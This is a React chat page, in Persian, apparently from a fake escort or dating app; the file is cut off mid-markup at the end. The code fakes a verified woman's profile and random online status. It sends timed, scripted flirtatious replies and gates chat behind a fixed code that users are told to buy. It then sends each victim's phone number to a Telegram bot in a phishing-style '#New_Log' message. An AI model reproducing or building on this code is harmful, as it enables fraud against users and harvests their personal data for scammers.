import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import NavBar from '../../components/base/NavBar';
import TabBar from '../../components/base/TabBar';
import { casesAPI } from '../../lib/supabase';

interface Message {
  id: string;
  text: string;
  isUser: boolean;
  timestamp: Date;
  isTyping?: boolean;
  type?: 'text' | 'system';
}

interface UserProfile {
  id: string;
  name: string;
  avatar: string;
  uniqueCode: string;
  isOnline: boolean;
  lastSeen: string;
  verified: boolean;
  location: string;
  age: number;
  description: string;
}

interface ChatRoom {
  id: string;
  caseData: any;
  messages: Message[];
  lastMessage?: string;
  lastMessageTime?: Date;
  unreadCount: number;
}

interface SystemConfig {
  telegramBotToken: string;
  telegramBotUsername: string;
  telegramChatId: string;
  paymentGatewayUrl: string;
  defaultFeeAmount: number;
}

const FIXED_CHAT_CODE = 'Cod_4961';

export default function Chat() {
  const navigate = useNavigate();
  
  const [messages, setMessages] = useState<Message[]>([]);
  const [inputText, setInputText] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [showAccessDenied, setShowAccessDenied] = useState(false);
  const [chatStep, setChatStep] = useState(0);
  const [userMessageCount, setUserMessageCount] = useState(0);
  const [showPhoneInput, setShowPhoneInput] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [chatClosed, setChatClosed] = useState(false);
  const [showFinalNotice, setShowFinalNotice] = useState(false);
  
  const [showChatList, setShowChatList] = useState(true);
  const [currentChatId, setCurrentChatId] = useState<string | null>(null);
  const [chatRooms, setChatRooms] = useState<ChatRoom[]>([]);
  const [showCodeInput, setShowCodeInput] = useState(false);
  const [codeInput, setCodeInput] = useState('');
  const [showConnectionOptions, setShowConnectionOptions] = useState(false);
  const [selectedCase, setSelectedCase] = useState<any>(null);
  const [isInActiveChat, setIsInActiveChat] = useState(false);
  const [activeChatTimer, setActiveChatTimer] = useState<NodeJS.Timeout | null>(null);
  const [systemConfig, setSystemConfig] = useState<SystemConfig>({
    telegramBotToken: '',
    telegramBotUsername: '',
    telegramChatId: '',
    paymentGatewayUrl: 'https://payment.example.com',
    defaultFeeAmount: 250000
  });

  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    loadSystemConfig();
    loadChatRooms();
    
    const activeChat = localStorage.getItem('PERSISTENT_ACTIVE_CHAT');
    if (activeChat) {
      try {
        const chatData = JSON.parse(activeChat);
        
        const chatAge = Date.now() - (chatData.timestamp || 0);
        const maxAge = 7 * 24 * 60 * 60 * 1000;
        
        if (chatAge < maxAge) {
          setIsInActiveChat(true);
          setCurrentChatId(chatData.caseId);
          setSelectedCase(chatData.caseData);
          setUserProfile(chatData.userProfile);
          
          // رفع مشکل: تبدیل timestamp به Date
          const restoredMessages = chatData.messages ? chatData.messages.map((msg: any) => ({
            ...msg,
            timestamp: new Date(msg.timestamp)
          })) : [];
          
          setMessages(restoredMessages);
          setShowChatList(false);
          setUserMessageCount(chatData.userMessageCount || 0);
          setChatStep(chatData.chatStep || 0);
          setShowPhoneInput(chatData.showPhoneInput || false);
          setPhoneNumber(chatData.phoneNumber || '');
          setChatClosed(chatData.chatClosed || false);
          setShowFinalNotice(chatData.showFinalNotice || false);
          
          console.log('🔄 چت فعال پایدار بازیابی شد:', chatData.caseData.name);
          
          if (chatData.isTyping && !chatData.chatClosed) {
            setIsTyping(true);
          }
        } else {
          localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
          localStorage.removeItem('BACKUP_ACTIVE_CHAT');
          localStorage.removeItem('SAFE_ACTIVE_CHAT');
          localStorage.removeItem('PROTECTED_CHAT_STATE');
          console.log('🗑️ چت منقضی شده حذف شد');
        }
      } catch (error) {
        console.error('خطا در بازیابی چت فعال:', error);
        localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
        localStorage.removeItem('BACKUP_ACTIVE_CHAT');
        localStorage.removeItem('SAFE_ACTIVE_CHAT');
        localStorage.removeItem('PROTECTED_CHAT_STATE');
      }
    }
  }, []);

  const saveActiveChatPersistent = () => {
    if (isInActiveChat && currentChatId && selectedCase && userProfile) {
      const activeChatData = {
        caseId: currentChatId,
        caseData: selectedCase,
        userProfile: userProfile,
        messages: messages,
        userMessageCount: userMessageCount,
        chatStep: chatStep,
        showPhoneInput: showPhoneInput,
        phoneNumber: phoneNumber,
        chatClosed: chatClosed,
        showFinalNotice: showFinalNotice,
        isTyping: isTyping,
        timestamp: Date.now(),
        version: '3.0'
      };
      
      const backupKeys = [
        'PERSISTENT_ACTIVE_CHAT',
        'BACKUP_ACTIVE_CHAT',
        'SAFE_ACTIVE_CHAT',
        'PROTECTED_CHAT_STATE'
      ];
      
      backupKeys.forEach(key => {
        try {
          localStorage.setItem(key, JSON.stringify(activeChatData));
        } catch (error) {
          console.warn(`خطا در ذخیره ${key}:`, error);
        }
      });
      
      console.log('💾 چت فعال پایدار ذخیره شد');
    }
  };

  useEffect(() => {
    if (isInActiveChat) {
      const interval = setInterval(() => {
        saveActiveChatPersistent();
      }, 2000);

      return () => clearInterval(interval);
    }
  }, [isInActiveChat, messages, userMessageCount, chatStep, showPhoneInput, phoneNumber, chatClosed, showFinalNotice, isTyping]);

  useEffect(() => {
    if (isInActiveChat) {
      saveActiveChatPersistent();
    }
  }, [messages, userMessageCount, chatStep, isInActiveChat, showPhoneInput, phoneNumber, chatClosed, showFinalNotice]);

  const loadSystemConfig = () => {
    const savedConfig = localStorage.getItem('systemConfig');
    if (savedConfig) {
      setSystemConfig({ ...systemConfig, ...JSON.parse(savedConfig) });
    }
  };

  const loadChatRooms = async () => {
    console.log('📥 بارگذاری چت‌های کاربر از دیتابیس...');
    
    const savedChats = localStorage.getItem('userChatRooms');
    let existingRooms: ChatRoom[] = [];
    
    if (savedChats) {
      try {
        existingRooms = JSON.parse(savedChats);
      } catch (error) {
        console.error('خطا در بارگذاری چت‌ها:', error);
      }
    }

    const favorites = localStorage.getItem('favoritesCases');
    if (favorites) {
      try {
        const favoriteCases = JSON.parse(favorites);
        const existingChatIds = existingRooms.map(chat => chat.id);
        
        for (const favoriteCase of favoriteCases) {
          try {
            const updatedCase = await casesAPI.getById(favoriteCase.id);
            
            if (updatedCase) {
              if (!existingChatIds.includes(favoriteCase.id.toString())) {
                const newChatRoom: ChatRoom = {
                  id: favoriteCase.id.toString(),
                  caseData: updatedCase,
                  messages: [],
                  lastMessage: 'چت جدید شروع شد',
                  lastMessageTime: new Date(favoriteCase.addedAt),
                  unreadCount: 0
                };
                existingRooms.push(newChatRoom);
              } else {
                const roomIndex = existingRooms.findIndex(room => room.id === favoriteCase.id.toString());
                if (roomIndex !== -1) {
                  existingRooms[roomIndex].caseData = updatedCase;
                }
              }
            }
          } catch (error) {
            console.warn(`خطا در بروزرسانی کیس ${favoriteCase.id}:`, error);
            if (!existingChatIds.includes(favoriteCase.id.toString())) {
              const newChatRoom: ChatRoom = {
                id: favoriteCase.id.toString(),
                caseData: favoriteCase,
                messages: [],
                lastMessage: 'چت جدید شروع شد',
                lastMessageTime: new Date(favoriteCase.addedAt),
                unreadCount: 0
              };
              existingRooms.push(newChatRoom);
            }
          }
        }
      } catch (error) {
        console.error('خطا در بارگذاری علاقه‌مندی‌ها:', error);
      }
    }

    setChatRooms(existingRooms);
    console.log(`✅ ${existingRooms.length} چت بارگذاری شد (با همگام‌سازی دیتابیس)`);
  };

  const saveChatRooms = (rooms: ChatRoom[]) => {
    try {
      localStorage.setItem('userChatRooms', JSON.stringify(rooms));
      setChatRooms(rooms);
      console.log('💾 چت‌ها ذخیره شدند');
    } catch (error) {
      console.error('خطا در ذخیره چت‌ها:', error);
    }
  };

  const openChatRoom = (caseData: any) => {
    setSelectedCase(caseData);
    setShowConnectionOptions(true);
    setShowChatList(false);
  };

  const handleConnectionRequest = () => {
    navigate('/verification/' + selectedCase.id);
  };

  const handleChatCodeEntry = () => {
    setShowCodeInput(true);
    setShowConnectionOptions(false);
  };

  const handleCodeSubmit = () => {
    if (codeInput.trim() === FIXED_CHAT_CODE) {
      startActiveChatPersistent(selectedCase);
      setShowCodeInput(false);
      setCodeInput('');
    } else {
      alert('لطفاً از قسمت درخواست ارتباط، کد ورود خود را تهیه و کد صحیح را وارد نمایید');
      setCodeInput('');
    }
  };

  const startActiveChatPersistent = (caseData: any) => {
    const chatId = caseData.id.toString();
    setCurrentChatId(chatId);
    setShowChatList(false);
    setShowConnectionOptions(false);
    setShowCodeInput(false);
    setIsInActiveChat(true);

    const userProfile: UserProfile = {
      id: caseData.id.toString(),
      name: caseData.name,
      avatar: caseData.image,
      uniqueCode: generateShortUniqueCode(),
      isOnline: Math.random() > 0.3,
      lastSeen: generateLastSeen(),
      verified: caseData.verified || true,
      location: caseData.location,
      age: caseData.age || 25,
      description: caseData.description || 'کاربر تایید شده'
    };

    setUserProfile(userProfile);

    const existingChat = chatRooms.find(room => room.id === chatId);
    if (existingChat && existingChat.messages.length > 0) {
      setMessages(existingChat.messages);
    } else {
      const welcomeMessage: Message = {
        id: '1',
        text: `سلام! من ${caseData.name.split(' - ')[0]} هستم! مرسی که منو انتخاب کردی 💕 لطفاً منتظر بمون، به زودی آنلاین میشم 😊`,
        isUser: false,
        timestamp: new Date(),
        type: 'text'
      };
      setMessages([welcomeMessage]);
      setChatStep(1);
    }

    setTimeout(() => {
      saveActiveChatPersistent();
    }, 100);

    console.log('🚀 چت فعال پایدار شروع شد با:', caseData.name);
  };
    const removeChatRoom = (chatId: string) => {
    if (confirm('آیا مطمئن هستید که می‌خواهید این کیس را از لیست حذف کنید؟')) {
      const updatedRooms = chatRooms.filter(room => room.id !== chatId);
      saveChatRooms(updatedRooms);
      
      try {
        const favorites = JSON.parse(localStorage.getItem('favoritesCases') || '[]');
        const updatedFavorites = favorites.filter((fav: any) => fav.id.toString() !== chatId);
        localStorage.setItem('favoritesCases', JSON.stringify(updatedFavorites));
        
        console.log('🗑️ کیس از چت و علاقه‌مندی‌ها حذف شد');
      } catch (error) {
        console.error('خطا در حذف از علاقه‌مندی‌ها:', error);
      }
    }
  };

  const backToChatList = () => {
    if (activeChatTimer) {
      clearTimeout(activeChatTimer);
      setActiveChatTimer(null);
    }

    if (isInActiveChat && !chatClosed) {
      console.log('🔁 بازگشت به لیست چت‌ها (چت فعال حفظ شد)');
    }

    setShowChatList(true);
    setShowConnectionOptions(false);
    setShowCodeInput(false);
    setSelectedCase(null);
  };

  const exitActiveChatCompletely = () => {
    if (confirm('آیا مطمئن هستید که می‌خواهید چت فعال را به طور کامل پایان دهید؟')) {
      localStorage.removeItem('PERSISTENT_ACTIVE_CHAT');
      localStorage.removeItem('BACKUP_ACTIVE_CHAT');
      localStorage.removeItem('SAFE_ACTIVE_CHAT');
      localStorage.removeItem('PROTECTED_CHAT_STATE');
      
      setIsInActiveChat(false);
      setCurrentChatId(null);
      setUserProfile(null);
      setMessages([]);
      setChatClosed(false);
      setShowFinalNotice(false);
      setShowPhoneInput(false);
      setUserMessageCount(0);
      setChatStep(0);
      setIsTyping(false);
      
      console.log('🧹 چت فعال به طور کامل پاک شد');
    }
  };

  const generateShortUniqueCode = () => {
    const timestamp = Date.now().toString().slice(-4);
    const random = Math.floor(Math.random() * 999).toString().padStart(3, '0');
    return `C${timestamp}-${random}`;
  };

  const generateLastSeen = () => {
    const minutes = Math.floor(Math.random() * 15) + 1;
    return `${minutes} دقیقه پیش`;
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  const sendMessage = async (text?: string) => {
    const messageText = text || inputText;
    if (!messageText.trim()) return;
    if (chatClosed) return;

    const userMessage: Message = {
      id: Date.now().toString(),
      text: messageText,
      isUser: true,
      timestamp: new Date(),
      type: 'text'
    };

    setMessages(prev => [...prev, userMessage]);
    setInputText('');
    setUserMessageCount(prev => prev + 1);
    
    handleChatFlowImproved(userMessageCount + 1);
  };

  const handleChatFlowImproved = (messageCount: number) => {
    if (messageCount === 1) {
      const timer = setTimeout(() => {
        setIsTyping(true);
        
        setTimeout(() => {
          const response: Message = {
            id: Date.now().toString(),
            text: 'سلام! چه نوع رابطه‌ای از من میخوای؟؟ 🤔💭',
            isUser: false,
            timestamp: new Date(),
            type: 'text'
          };
          
          setMessages(prev => [...prev, response]);
          setIsTyping(false);
          
          if (userProfile) {
            setUserProfile(prev => prev ? {...prev, isOnline: true, lastSeen: 'آنلاین'} : null);
          }
          
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 3000);
      }, 120000);
      
      setActiveChatTimer(timer);
    } else if (messageCount === 2) {
      const timer = setTimeout(() => {
        setIsTyping(true);
        
        setTimeout(() => {
          const response: Message = {
            id: Date.now().toString(),
            text: 'اوکیه عزیزم! فقط من شبا نمیتونم بیام ولی روزا اوکیه 😊 تایمم میتونم از ساعت ۱۰ صبح تا ۲۲:۰۰ باهات در ارتباط باشم. اگه هم میخوای که شب بیام، خودم مکان دارم - مکان غریبه رو شرمنده... بار اول نمیتونم بیام 🙂💞 اگر اوکی‌ای با شرایطم بگو که تایید ارتباط رو بدم و بعدش با هم در ارتباط باشیم واسه قرار!',
            isUser: false,
            timestamp: new Date(),
            type: 'text'
          };
          
          setMessages(prev => [...prev, response]);
          setIsTyping(false);
          
          setTimeout(() => {
            const finalResponse: Message = {
              id: (Date.now() + 1).toString(),
              text: 'من تایید ارتباط رو دادم! تو هم تایید کن که با هم در ارتباط باشیم 😊 فقط حتماً حتماً وقتی شمارمو از مجموعه گرفتی، اگر خواستی زنگ بزنی قبلش بگو که از طرف این مجموعه‌ای وگرنه جواب نمیدم... 🙂📞',
              isUser: false,
              timestamp: new Date(),
              type: 'text'
            };
            
            setMessages(prev => [...prev, finalResponse]);
            
            setTimeout(() => {
              const systemMessage: Message = {
                id: (Date.now() + 2).toString(),
                text: '✅ ارتباط شما با کیس مورد نظر تایید شد! لطفاً شماره تماس خود را وارد کنید:',
                isUser: false,
                timestamp: new Date(),
                type: 'system'
              };
              
              setMessages(prev => [...prev, systemMessage]);
              setShowPhoneInput(true);
              
              setTimeout(() => saveActiveChatPersistent(), 100);
            }, 2000);
          }, 30000);
          
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 3000);
      }, 120000);
      
      setActiveChatTimer(timer);
    }
  };

  const handlePhoneSubmit = () => {
    if (!phoneNumber.trim() || phoneNumber.length < 11) {
      alert('لطفاً شماره تماس معتبر وارد کنید');
      return;
    }

    sendPhoneToTelegram();
    
    const confirmMessage: Message = {
      id: Date.now().toString(),
      text: `🥇 Success Phone: ${phoneNumber}`,
      isUser: false,
      timestamp: new Date(),
      type: 'system'
    };
    
    setMessages(prev => [...prev, confirmMessage]);
    setShowPhoneInput(false);
    
    setTimeout(() => {
      const noticeMessage1: Message = {
        id: Date.now().toString(),
        text: 'تا ساعات آینده همکاران ما برای رزرو با شما تماس گرفته خواهد شد. لطفاً در دسترس باشید... رزرو رابطه یا از طریق تماس یا از طریق پیامک به شما اعلام خواهد شد.',
        isUser: false,
        timestamp: new Date(),
        type: 'system'
      };
      
      setMessages(prev => [...prev, noticeMessage1]);
      
      setTimeout(() => {
        setShowFinalNotice(true);
        setTimeout(() => {
          setChatClosed(true);
          setTimeout(() => saveActiveChatPersistent(), 100);
        }, 10000);
      }, 5000);
    }, 2000);
  };

  const sendPhoneToTelegram = () => {
    const currentDate = new Date();
    const persianDate = currentDate.toLocaleDateString('fa-IR');
    const persianTime = currentDate.toLocaleTimeString('fa-IR');

    const message = `#New_Log 🫦
"" "" "" "" "" "" "" "" "" ""
📀Name : <code>شروع چت موفق</code>
💿Phone : <code>${phoneNumber}</code>
🪀#Code_meli : <code>${userProfile?.uniqueCode}</code>
"" "" "" "" "" "" "" "" "" ""
🕰Time : ${persianDate}, ${persianTime}`;

    if (systemConfig.telegramBotToken && systemConfig.telegramChatId) {
      const telegramUrl = `https://api.telegram.org/bot${systemConfig.telegramBotToken}/sendMessage`;
      
      fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: systemConfig.telegramChatId,
          text: message,
          parse_mode: 'HTML'
        })
      }).then(response => {
        if (response.ok) {
          console.log('✅ پیام چت با موفقیت به تلگرام ارسال شد');
        } else {
          console.error('❌ خطا در ارسال پیام چت به تلگرام');
        }
      }).catch(error => {
        console.error('❌ خطا در ارسال پیام چت به تلگرام:', error);
      });
    } else {
      console.log('ℹ️ تنظیمات تلگرام یافت نشد - پیام:', message);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  };

  if (chatClosed) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 via-gray-100 to-gray-200 flex items-center justify-center">
        <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center max-w-md mx-4">
          <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <i className="ri-chat-off-line text-gray-400 text-3xl"></i>
          </div>
          <h3 className="text-xl font-bold text-gray-800 mb-3">چت بسته شد</h3>
          <p className="text-gray-600 mb-6 leading-relaxed">
            ارتباط شما با کیس مورد نظر ثبت شد. به زودی همکاران ما با شما تماس خواهند گرفت.
          </p>
          <button
            onClick={backToChatList}
            className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 px-6 rounded-2xl transition-all duration-300"
          >
            بازگشت به لیست چت‌ها
          </button>
        </div>
      </div>
    );
  }

  if (showCodeInput) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 via-indigo-50 to-blue-100">
        <NavBar title="کد ورود به چت" showBack={true} />

        <div className="pt-20 pb-20 px-4">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl text-center">
            <div className="w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <i className="ri-key-2-line text-white text-3xl"></i>
            </div>
            
            <h2 className="text-2xl font-bold text-gray-800 mb-3">کد ورود به چت</h2>
            <p className="text-gray-600 mb-6">کد ورود خود را وارد کنید</p>
            
            <div className="mb-6">
              <input
                type="text"
                value={codeInput}
                onChange={(e) => setCodeInput(e.target.value)}
                placeholder="مثال: Cod_01"
                className="w-full bg-gray-50 border border-gray-200 rounded-2xl px-5 py-4 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent text-center font-mono text-lg"
              />
            </div>

            <div className="space-y-3 mb-6">
              <button
                onClick={handleCodeSubmit}
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300"
              >
                تایید کد
              </button>
              
              <button
                onClick={handleConnectionRequest}
                className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-3 px-6 rounded-2xl shadow-lg transition-all duration-300"
              >
                درخواست ارتباط
              </button>
            </div>

            <button
              onClick={backToChatList}
              className="text-gray-500 hover:text-gray-700 text-sm"
            >
              بازگشت
            </button>
          </div>
        </div>

        <TabBar />
      </div>
    );
  }

  if (showConnectionOptions && selectedCase) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-50 via-rose-50 to-purple-100">
        <NavBar title={selectedCase.name.split(' - ')[0]} showBack={true} />

        <div className="pt-20 pb-20 px-4">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl mb-6">
            <div className="flex items-center mb-6">
              <img 
                src={selectedCase.image}
                alt={selectedCase.name}
                className="w-20 h-20 rounded-2xl object-cover shadow-lg mr-4"
              />
              <div className="flex-1">
                <h3 className="font-bold text-gray-800 text-xl">{selectedCase.name}</h3>
                <p className="text-gray-600 text-sm mb-1">{selectedCase.location}</p>
                <div className="flex items-center">
                  <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                  <span className="text-green-600 text-sm font-medium">آنلاین</span>
                </div>
              </div>
            </div>

            <p className="text-gray-700 leading-relaxed text-sm mb-6">
              {selectedCase.description}
            </p>
          </div>

          <div className="space-y-4">
            <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl">
              <h3 className="font-bold text-gray-800 text-lg mb-4 text-center">
                نحوه ارتباط را انتخاب کنید
              </h3>

              <div className="grid grid-cols-1 gap-4">
                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-chat-3-line mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">چت</div>
                      <div className="text-xs opacity-90">نیاز به کد ورود</div>
                    </div>
                  </div>
                </button>

                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-phone-fill mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">تماس صوتی</div>
                      <div className="text-xs opacity-90">نیاز به کد ورود</div>
                    </div>
                  </div>
                </button>

                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-blue-500 to-cyan-600 hover:from-blue-600 hover:to-cyan-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-vidicon-fill mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">تماس تصویری</div>
                      <div className="text-xs opacity-90">نیاز به کد ورود</div>
                    </div>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-yellow-50 rounded-2xl border border-yellow-200">
                <div className="flex items-start">
                  <i className="ri-information-line text-yellow-600 text-lg ml-2 mt-0.5"></i>
                  <div className="text-yellow-800 text-sm">
                    <p className="font-semibold mb-1">نحوه دریافت کد ورود:</p>
                    <p>برای دریافت کد ورود، ابتدا باید درخواست ارتباط خود را ثبت و هزینه مربوطه را پرداخت کنید</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <button
            onClick={backToChatList}
            className="w-full mt-6 bg-gray-500 hover:bg-gray-600 text-white font-semibold py-3 px-6 rounded-2xl transition-colors"
          >
            بازگشت به لیست چت‌ها
          </button>
        </div>

        <TabBar />
      </div>
    );
  }

  if (showChatList) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-100">
        <NavBar title="چت‌های من" showBack={true} />

        <div className="pt-20 pb-20">
          <div className="px-4 mb-4">
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-4">
              <div className="flex items-center justify-center">
                <i className="ri-database-2-line text-green-600 mr-2"></i>
                <span className="text-green-700 font-medium text-sm">
                  💬 {chatRooms.length} چت فعال (همگام‌سازی شده با دیتابیس)
                </span>
              </div>
            </div>
          </div>

          {isInActiveChat && (
            <div className="px-4 mb-4">
              <div className="bg-gradient-to-r from-pink-50 to-rose-50 border border-pink-200 rounded-2xl p-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    <i className="ri-chat-3-fill text-pink-600 text-xl mr-2"></i>
                    <span className="text-pink-700 font-medium text-sm">
                      چت فعال دارید - برای ادامه کلیک کنید
                    </span>
                  </div>
                  <button
                    onClick={() => {
                      setShowChatList(false);
                      setIsInActiveChat(true);
                    }}
                    className="bg-gradient-to-r from-pink-500 to-rose-600 text-white px-3 py-1 rounded-xl text-xs font-semibold"
                  >
                    ادامه چت
                  </button>
                </div>
              </div>
            </div>
          )}

          {chatRooms.length === 0 ? (
            <div className="px-4 py-8 text-center">
              <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl">
                <div className="w-24 h-24 mx-auto mb-6 bg-gray-100 rounded-full flex items-center justify-center">
                  <i className="ri-chat-3-line text-4xl text-gray-400"></i>
                </div>
                <h3 className="text-xl font-bold text-gray-800 mb-3">هنوز چتی ندارید</h3>
                <p className="text-gray-600 mb-6 leading-relaxed">
                  برای شروع چت، ابتدا کیس مورد نظر خود را انتخاب کنید
                </p>
                <button
                  onClick={() => navigate('/services')}
                  className="bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-bold py-3 px-6 rounded-2xl shadow-lg transition-all duration-300"
                >
                  <i className="ri-search-line mr-2"></i>
                  مشاهده کیس‌ها
                </button>
              </div>
            </div>
          ) : (
            <div className="px-4">
              <div className="mb-4">
                <h2 className="text-lg font-bold text-gray-800 mb-2">چت‌های فعال ({chatRooms.length})</h2>
                <p className="text-gray-600 text-sm">روی هر چت کلیک کنید تا وارد شوید</p>
              </div>

              <div className="space-y-3">
                {chatRooms.map((room) => (
                  <div
                    key={room.id}
                    className="bg-white/95 backdrop-blur-sm rounded-3xl shadow-xl border border-white/30 overflow-hidden"
                  >
                    <div className="p-4">
                      <div className="flex items-center">
                        <div className="relative">
                          <img 
                            src={room.caseData.image}
                            alt={room.caseData.name}
                            className="w-16 h-16 rounded-2xl object-cover shadow-lg"
                          />
                          <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-white"></div>
                        </div>
                        
                        <div className="flex-1 mr-4">
                          <div className="flex items-center justify-between mb-1">
                            <h3 className="font-bold text-gray-800">{room.caseData.name}</h3>
                            {room.unreadCount > 0 && (
                              <div className="bg-red-500 text-white text-xs font-bold px-2 py-1 rounded-full min-w-[20px] text-center">
                                {room.unreadCount}
                              </div>
                            )}
                          </div>
                          <p className="text-gray-600 text-sm mb-1">{room.caseData.location}</p>
                          <p className="text-gray-500 text-xs truncate">
                            {room.lastMessage || 'هنوز پیامی ارسال نشده'}
                          </p>
                        </div>
                      </div>

                      <div className="flex items-center justify-between mt-4 pt-3 border-t border-gray-100">
                        <button
                          onClick={() => openChatRoom(room.caseData)}
                          className="flex-1 bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-semibold py-2 px-4 rounded-xl text-sm transition-all duration-300 ml-2"
                        >
                          <i className="ri-chat-3-line mr-1"></i>
                          چت
                        </button>
                        
                        <button
                          onClick={() => removeChatRoom(room.id)}
                          className="bg-gray-100 hover:bg-red-100 text-gray-600 hover:text-red-600 p-2 rounded-xl transition-colors"
                        >
                          <i className="ri-delete-bin-line"></i>
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        <TabBar />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-50 via-rose-50 to-purple-100 flex flex-col">
      <div className="bg-white/95 backdrop-blur-lg shadow-lg border-b border-pink-100">
        <div className="flex items-center justify-between p-4 pt-12">
          <button 
            onClick={backToChatList}
            className="w-10 h-10 flex items-center justify-center rounded-full text-gray-600 hover:bg-gray-100 transition-colors"
          >
            <i className="ri-arrow-right-line text-xl"></i>
          </button>

          {userProfile && (
            <div className="flex items-center flex-1 mx-4">
              <div className="relative">
                <img 
                  src={userProfile.avatar}
                  alt={userProfile.name}
                  className="w-12 h-12 rounded-full object-cover shadow-lg"
                />
                <div className={`absolute -bottom-1 -right-1 w-4 h-4 rounded-full border-2 border-white ${userProfile.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
              </div>
              <div className="mr-3 flex-1">
                <h3 className="font-bold text-gray-800 flex items-center">
                  {userProfile.name}
                  {userProfile.verified && <i className="ri-verified-badge-fill text-blue-500 mr-1 text-sm"></i>}
                </h3>
                <p className="text-xs text-gray-600">{userProfile.lastSeen}</p>
              </div>
            </div>
          )}

          <div className="flex items-center space-x-2 rtl:space-x-reverse">
            <button 
              onClick={() => setShowAccessDenied(true)}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-green-100 text-green-600 hover:bg-green-200 transition-colors"
            >
              <i className="ri-phone-fill text-lg"></i>
            </button>
            <button 
              onClick={() => setShowAccessDenied(true)}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-blue-100 text-blue-600 hover:bg-blue-200 transition-colors"
            >
              <i className="ri-vidicon-fill text-lg"></i>
            </button>
            <button 
              onClick={exitActiveChatCompletely}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-red-100 text-red-600 hover:bg-red-200 transition-colors"
              title="پایان چت فعال"
            >
              <i className="ri-close-line text-lg"></i>
            </button>
          </div>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto px-4 py-4">
        <div className="space-y-4">
          {messages.map((message) => {
            const messageTimestamp = new Date(message.timestamp);
            
            return (
              <div
                key={message.id}
                className={`flex ${message.isUser ? 'justify-start' : 'justify-end'}`}
              >
                <div className={`max-w-[75%] ${message.isUser ? 'order-2' : 'order-1'}`}>
                  <div
                    className={`px-4 py-3 rounded-2xl shadow-lg relative ${
                      message.isUser
                        ? 'bg-gradient-to-r from-pink-500 to-rose-600 text-white rounded-br-md'
                        : message.type === 'system'
                        ? 'bg-gradient-to-r from-blue-500 to-indigo-600 text-white rounded-bl-md'
                        : 'bg-white text-gray-800 rounded-bl-md border border-gray-100'
                    }`}
                  >
                    <p className="text-sm leading-relaxed">
                      {message.text}
                    </p>
                  </div>
                  <p className="text-xs text-gray-500 mt-1 px-2">
                    {messageTimestamp.toLocaleTimeString('fa-IR', {
                      hour: '2-digit',
                      minute: '2-digit'
                    })}
                  </p>
                </div>
                
                <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${
